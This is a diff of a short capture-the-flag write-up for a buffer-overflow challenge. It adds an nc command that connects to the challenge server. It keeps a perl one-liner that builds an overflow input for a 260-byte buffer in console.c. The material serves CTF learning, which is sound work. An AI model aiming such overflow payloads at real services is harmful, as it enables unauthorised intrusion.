@@ -6,5 +6,6 @@ Success, you've gotten the picture of your lost love, not knowing that pictures 
 
 ## Steps
 
-1. Look at `console.c`, buffer can hold 260 bytes
-1. perl -e 'print "run"."\x0a\x00"."A"x268' > exploit.txt
+1. `nc buffer-overflow.ctfcompetition.com 1337`
+2. Look at `console.c`, buffer can hold 260 bytes
+3. perl -e 'print "run"."\x0a\x00"."A"x268' > exploit.txt
